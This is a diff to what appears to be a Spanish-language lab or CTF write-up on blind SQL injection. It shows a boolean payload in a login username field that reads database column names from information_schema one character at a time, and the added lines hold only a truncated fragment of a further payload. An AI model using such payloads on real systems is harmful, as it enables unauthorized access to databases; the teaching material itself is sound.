@@ -86,3 +86,7 @@ tenemos que hacer esto hasta sacar el nombre de la tabla
 ```python
 	username=kitty'+and+substring((select+column_name+from+information_schema.columns+where+columns_schema="siteusers"+limit+0,1),1,1)="a"+#&password=kitty
 ```
+
+```python
+kitty'+AND+SUB
+```
